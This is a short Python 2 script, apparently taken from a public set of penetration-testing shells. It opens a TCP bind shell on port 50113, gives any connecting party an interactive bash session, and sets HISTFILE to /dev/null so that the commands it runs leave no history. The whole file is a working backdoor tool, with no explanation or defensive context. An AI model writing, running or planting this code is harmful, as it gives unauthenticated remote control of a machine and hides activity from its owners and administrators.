#!/usr/bin/python2
# https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_bind.py
import os
import pty
import socket

lport = 50113

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
